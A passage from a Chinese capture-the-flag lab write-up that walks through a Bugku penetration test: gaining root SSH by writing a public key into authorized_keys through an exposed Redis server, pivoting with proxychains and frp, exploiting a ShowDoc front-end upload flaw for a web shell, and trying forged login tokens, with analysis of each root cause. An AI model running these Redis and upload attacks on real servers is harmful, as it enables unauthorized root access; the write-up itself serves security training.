**这样公钥已经在 Redis 内存里，但还没写到磁盘**。

接下来就连接redis cli：

这只是**连接到 Redis 服务端**发送 Redis 协议命令的**客户端工具**，不是登录目标操作系统。

这里连接的端口就是代理出来的端口

```bash
┌──(root㉿kali)-[~/.ssh]
└─# redis-cli -h 106.14.179.83 -p 60000 -a 123456
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
106.14.179.83:60000> config set dir /root/.ssh
#这一步是关键：修改 Redis 的保存目录到 /root/.ssh。当然，这要求 Redis 是 root 权限运行（否则没权限写 /root/.ssh）
OK
106.14.179.83:60000> config set dbfilename authorized_keys
#把 Redis 持久化时的文件名改为 authorized_keys（SSH 公钥信任文件）。
OK
106.14.179.83:60000> get crack
#get crack 是确认写入的公钥内容。
"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCo/82v7mI8s+uCluOEGE333Km1Z/I45RhR67JbaOtyXyreXdjWstuQGmPu2OsWasWjZEFtvCmcE2Skg0Y0FVq+0y44HEYaY21zbR5mL+r0i2bfTtmaZ/YTDDhAExjr/wf8NL8LP7jPWv1jw6u38QLwvIs2rhzDYL3r5LssLs29EY8uLXxW9TbwpvYQjyw1Aitczc+5uUF0sPtuPily6cJ7NrMN8412TEw4OqfKp38vUG5OXwhIKTX3XPlSHXunNYzfMZmYcCXuB+2xapwRKOVawU1w25/WMMD2HcSEBq+Sbh8mfEb4zGe7+N/V08RxSZwqrQd94US77AOyiGa/7J0vQdoJYk6l1Qbpuekb3A6Hq8q7VtdjDvhK1mePPOFjssRrgc2zbVYmQytl7i0KvoSJtzu1STmOijb89gQtTq9FUBb/CncL+8pjhM+AcW7bvoag6f5intq9shJ8r8MTWrNQaa0cJatVlym531CcNSGsILYm/XbrXRgiDFYc0HqQpgM= root@kali\n\n\n\n"
106.14.179.83:60000> save
#save 会将 Redis 内存中的所有数据写入磁盘（到 /root/.ssh/authorized_keys）。由于之前改了目录和文件名，这个 save 直接把公钥保存成了 SSH 认证文件。
OK
106.14.179.83:60000> exit

```

![image-20250805153930350](bugku渗透测试.assets/image-20250805153930350.png)

```bash
┌──(root㉿kali)-[~/.ssh]
└─# ssh -i id_rsa -p 60001 root@106.14.179.83
```

**SSH 免密登录**

使用之前生成的私钥 `id_rsa` 登录。目标服务器因为 `/root/.ssh/authorized_keys` 中有对应公钥，所以无需密码直接给 root权限了



再简单分析一下redis写入ssh公钥实现免密登录的成因：

首先，肯定要求redis的登陆端口对外可达。然后redis cli的配置也有问题，无密码或者弱密码，并且交互式界面中没有禁用危险操作，如：config。

**redis-cli** 是 Redis 官方提供的命令行客户端工具，可以跟 Redis 服务器直接交互。就和类似 MySQL 有 `mysql` 命令，MongoDB 有 `mongosh`差不多。所以如果 Redis 配置不当，攻击者就可以远程用 `redis-cli` 连上去做任何事（包括写文件提权、持久化 Webshell 等）。

同时，redis进程对目标写入路径需要有权限，如以root身份运行，就能写入到/root/.ssh。

公钥写入关键路径后，我就可以拿着我的私钥去做登录，而不需要密码。

### flag2——redis端口公网暴露+密钥伪造

![image-20250805154019391](bugku渗透测试.assets/image-20250805154019391.png)



cat一下Note.md:

![image-20250805154247222](bugku渗透测试.assets/image-20250805154247222.png)

发现一个密码：

```js
Dev@Bug_C00l123
```

接下来呢？发现漏掉了上面的一个254段没扫，那只能再弹一个shell来扫一下：

![image-20250805154928571](bugku渗透测试.assets/image-20250805154928571.png)

发现也有一个22000，那也尝试登录一下：

同样做毒液的内网代理，把端口带出来



### flag3——信息泄露+redis问题

输入刚刚拿到的密码：

![image-20250805155311292](bugku渗透测试.assets/image-20250805155311292.png)

其实机子里一共有两个flag，一个在根目录下一个在root里。但是提交的时候显示已经提交过了，没啥用。



ok接下来感觉没东西了

那就继续看看网段呗：

发现ifconfig和ip address全部失效，那就直接查文件：

```bash
cat /proc/net/fib_trie
```

![image-20250811150829286](bugku渗透测试.assets/image-20250811150829286.png)

发现在 .202 中还存在一个172网段

那就再代理出来：

![image-20250811152517344](bugku渗透测试.assets/image-20250811152517344.png)



![image-20250811152541332](bugku渗透测试.assets/image-20250811152541332-1754897142083-1.png)



```bash
vi /etc/proxychains4.conf

socks5 106.14.179.83 62222

proxychains4
```

但是好像代理失败了，那就直接传fscan：

![image-20250812102818160](bugku渗透测试.assets/image-20250812102818160.png)

ok显而易见就是要找.0.153的了，再扫一下它的全端口：

![image-20250812103044722](bugku渗透测试.assets/image-20250812103044722.png)

一个80，一个22000。那就先去看看它的网页，做毒液代理

还是没代出来，那就换frp试试吧：

![image-20250812104500054](bugku渗透测试.assets/image-20250812104500054.png)

22000端口：

![image-20250812104632168](bugku渗透测试.assets/image-20250812104632168.png)

**注意这里[[proxies]]不能修改！**之前没怎么用过frp进坑了。。。

先代80出来看看：

![image-20250812110312316](bugku渗透测试.assets/image-20250812110312316.png)

本机接受：

![image-20250812110331837](bugku渗透测试.assets/image-20250812110331837.png)

发现是showdoc：![image-20250812110455380](bugku渗透测试.assets/image-20250812110455380.png)

用初始密码showdoc/123456登录失败



搜索历史漏洞：发现存在sql注入，但是前台未登录处的注入点不存在，所以现在就继续要找任意用户登录的漏洞或者是不需要登录就能利用的漏洞。



好利用网上的一个前台文件上传的poc发现成功回显了上传路径：

![image-20250812111544898](bugku渗透测试.assets/image-20250812111544898.png)

ok成功复现确认漏洞点：

![image-20250812111633909](bugku渗透测试.assets/image-20250812111633909.png)

直接蚁剑连接，根目录下发现flag

### flag4——showdoc前台文件上传RCE

![image-20250812111844830](bugku渗透测试.assets/image-20250812111844830.png)

来看一下问题点：

![image-20250812112725477](bugku渗透测试.assets/image-20250812112725477.png)

ThinkPHP 框架的 `Upload` 类中，**`exts`** 作为指定允许上传的文件扩展名的标准属性。而 **`allowExts`** 并不是 `Upload` 类中的有效属性。所以这里指定类型失败。

当使用了无效属性时，PHP 并不会直接抛出错误（尤其是在配置数组中），而是简单地忽略该属性的设置。由于 PHP 的宽松特性，当你试图访问一个不存在的属性时，程序并不会中断或报错，只是忽略了这个设置。

并且这个上传图片的接口没有先checklogin！

所以就导致了前台文件任意上传

最后一个flag应该就是在22000端口了

先再翻一下目录

![](bugku渗透测试.assets/image-20250812113607543-1754969768231-1.png)

发现了一个sqlite，这个文件应该是ShowDoc 系统的“数据库”，是无需额外安装 MySQL 等数据库服务的，开箱即用，所有核心数据都保存在这个文件里。但是文件太大，准备下载下来丢给ai分析。结果发现是二进制文件没办法上传给ai看。。。

那就找个解析的网站

发现了一个用户

![image-20250812114458798](bugku渗透测试.assets/image-20250812114458798.png)

devteam/f2ef774f5af471562035a1847f307afc

![image-20250812114537557](bugku渗透测试.assets/image-20250812114537557.png)

这个密码应该是一串md5，但是破解失败了。。。

但是问题不大，里面还有user token可以用用看：

![image-20250812114913702](bugku渗透测试.assets/image-20250812114913702.png)

但是我尝试了各种cookie的构造方式

如

```js
Authorization: Bearer 9fc900c519fee817ae931572950ddefb397256c7f4ab83a1381cad5a801a17fc
```



```js
Cookie: PHPSESSID=a85108d9edeafda1cde6fb52ef720b13; think_language=zh-CN; token=9fc900c519fee817ae931572950ddefb397256c7f4ab83a1381cad5a801a17fc
```

POST

```js
redirect_login=false&token=9fc900c519fee817ae931572950ddefb397256c7f4ab83a1381cad5a801a17fc
redirect_login=true&token=9fc900c519fee817ae931572950ddefb397256c7f4ab83a1381cad5a801a17fc
token=9fc900c519fee817ae931572950ddefb397256c7f4ab83a1381cad5a801a17fc
```

均失败，有些返回200的error报错；也有些返回408

![image-20250812135540645](bugku渗透测试.assets/image-20250812135540645.png)

最后只能看看wp拿到token后使用cookie_token加在COOKIE后即可伪造上面的身份进行登录。（但是我也复现失败了，可能是环境问题？） 在登录后能拿到服务器账号密码：

root/Test@1234.

然后去连接22000代出到服务器的端口即可

### flag5——信息泄露+redis问题

![image-20250812130152925](bugku渗透测试.assets/image-20250812130152925.png)

完结撒花
